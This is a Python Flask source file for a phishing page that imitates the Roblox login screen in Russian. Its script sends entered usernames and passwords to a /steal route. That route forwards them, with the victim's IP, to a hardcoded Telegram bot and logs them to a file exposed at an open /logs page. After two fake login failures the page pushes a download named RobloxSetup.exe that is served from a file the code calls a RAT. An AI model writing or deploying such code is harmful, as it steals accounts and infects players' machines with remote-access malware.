from flask import Flask, request, send_file
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

# ===== ГЛАВНАЯ СТРАНИЦА =====
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Roblox — Вход</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background: #1b1b2f;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: 'Segoe UI', Arial, sans-serif;
            }
            .container {
                background: #16213e;
                padding: 40px 35px 35px;
                border-radius: 16px;
                width: 380px;
                box-shadow: 0 15px 40px rgba(0,0,0,0.8);
                text-align: center;
            }
            .container img {
                width: 180px;
                margin-bottom: 10px;
            }
            .container h2 {
                color: #fff;
                font-weight: 400;
                font-size: 24px;
                margin-bottom: 20px;
            }
            input {
                width: 100%;
                padding: 14px;
                margin: 8px 0;
                border: none;
                border-radius: 8px;
                background: #0f3460;
                color: white;
                font-size: 15px;
                box-sizing: border-box;
                transition: 0.2s;
            }
            input::placeholder {
                color: #8899aa;
            }
            input:focus {
                outline: 2px solid #00bfff;
                background: #1a4a7a;
            }
            .login-btn {
                width: 100%;
                padding: 14px;
                background: #00bfff;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                font-size: 18px;
                color: #fff;
                cursor: pointer;
                margin-top: 12px;
                transition: 0.2s;
            }
            .login-btn:hover {
                background: #009acd;
                transform: scale(1.02);
            }
            .error {
                color: #ff6b6b;
                font-size: 14px;
                margin-top: 12px;
                min-height: 22px;
            }
            .filename-box {
                margin-top: 20px;
                padding: 12px 15px;
                background: #0f3460;
                border-radius: 8px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                gap: 10px;
            }
            .filename-box span {
                color: #aaccff;
                font-size: 14px;
                font-family: monospace;
                word-break: break-all;
            }
            .copy-btn {
                background: #2a4a7a;
                border: none;
                color: white;
                padding: 6px 16px;
                border-radius: 4px;
                cursor: pointer;
                font-size: 13px;
                white-space: nowrap;
                transition: 0.2s;
            }
            .copy-btn:hover {
                background: #3a5a8a;
            }
            .download-btn {
                display: none;
                margin-top: 20px;
                padding: 14px;
                background: #00b894;
                border: none;
                border-radius: 8px;
                color: white;
                font-weight: bold;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                transition: 0.2s;
            }
            .download-btn:hover {
                background: #00a381;
                transform: scale(1.02);
            }
            .hint {
                color: #8899aa;
                font-size: 13px;
                margin-top: 20px;
            }
            .toast {
                position: fixed;
                bottom: 30px;
                left: 50%;
                transform: translateX(-50%);
                background: #00b894;
                color: white;
                padding: 12px 24px;
                border-radius: 10px;
                font-size: 15px;
                display: none;
                z-index: 999;
                box-shadow: 0 6px 20px rgba(0,0,0,0.3);
            }
        </style>
    </head>
    <body>

    <div class="container">
        <img src="https://www.roblox.com/favicon.ico" alt="Roblox">
        <h2>Войдите в Roblox</h2>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Имя пользователя или Email" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button class="login-btn" type="submit">Войти</button>
        </form>

        <div id="message" class="error"></div>

        <div class="filename-box">
            <span id="filenameDisplay">RobloxSetup.exe</span>
            <button class="copy-btn" id="copyFilenameBtn">📋 Копировать</button>
        </div>

        <button class="download-btn" id="downloadBtn">⬇️ Скачать RobloxSetup.exe</button>
        <div class="hint">🔒 Защищено соединение</div>
    </div>

    <div id="toast" class="toast">✅ Название скопировано!</div>

    <script>
        let attempts = 0;

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const login = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();

            if (!login || !pass) {
                document.getElementById('message').innerText = 'Заполните оба поля';
                return;
            }

            // Отправка данных на сервер
            try {
                await fetch('/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ login, pass })
                });
            } catch {}

            attempts++;
            document.getElementById('message').innerText = 'Неверный логин или пароль. Попробуйте снова.';
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';

            // ПОСЛЕ 2-Х ПОПЫТОК ПОКАЗЫВАЕМ КНОПКУ СКАЧИВАНИЯ
            if (attempts >= 2) {
                document.getElementById('message').innerHTML = '⚠️ <span style="color:#ffcc00;">Обнаружена проблема с входом.</span> Скачайте обновление Roblox.';
                document.getElementById('downloadBtn').style.display = 'block';
            }
        });

        // КОПИРОВАНИЕ НАЗВАНИЯ
        document.getElementById('copyFilenameBtn').addEventListener('click', function() {
            const filename = document.getElementById('filenameDisplay').innerText;
            navigator.clipboard.writeText(filename).then(() => {
                showToast('✅ Название скопировано!');
            }).catch(() => {
                // fallback
                const range = document.createRange();
                const span = document.getElementById('filenameDisplay');
                range.selectNode(span);
                window.getSelection().removeAllRanges();
                window.getSelection().addRange(range);
                document.execCommand('copy');
                showToast('✅ Название скопировано!');
            });
        });

        // СКАЧИВАНИЕ
        document.getElementById('downloadBtn').addEventListener('click', function() {
            window.location.href = '/download/roblox_setup.exe';
            this.innerText = '✅ Файл скачан! Запустите его для входа.';
            this.disabled = true;
            this.style.background = '#00b894';
        });

        // ВСПЛЫВАЮЩЕЕ УВЕДОМЛЕНИЕ
        function showToast(text) {
            const toast = document.getElementById('toast');
            toast.innerText = text;
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 3000);
        }
    </script>

    </body>
    </html>
    '''

# ===== ПРИЁМ ЛОГИНА И ПАРОЛЯ =====
@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    login = data.get('login')
    password = data.get('pass')
    ip = request.remote_addr

    msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
    send_tg(msg)

    with open('steals.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")

    return {"status": "ok"}, 200

# ===== СКАЧИВАНИЕ RAT =====
@app.route('/download/roblox_setup.exe')
def download_exe():
    try:
        return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
    except:
        return "Файл временно недоступен", 404

# ===== ЛОГИ =====
@app.route('/logs')
def logs():
    if not os.path.exists('steals.txt'):
        return "Нет логов"
    with open('steals.txt', 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
